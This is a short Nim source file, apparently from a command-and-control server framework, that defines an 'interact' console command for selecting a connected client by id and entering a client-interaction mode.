import strutils, asyncdispatch, tables

import ../../types
import ../../logging

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  if len(args) < 1:
    errorLog "you must provide a client id to interact with"
    return

  let clientId = parseInt(args[0])
  
  let c2cli = server.cli
  for client in server.clients:
    if client.id == clientId:
      c2cli.handlingClient = client
      c2cli.mode = ClientInteractMode

  if c2cli.handlingClient.isNil() or c2cli.handlingClient.id != clientId:
    infoLog "client not found"

let cmd*: Command = Command(
  execProc: execProc,
  name: "interact",
  aliases: @[
    "i"
  ],
  argsLength: 1,
  usage: @[
    "interact [clientID]",
  ],
  description: "Interact with a client",
  category: CCClientInteraction
)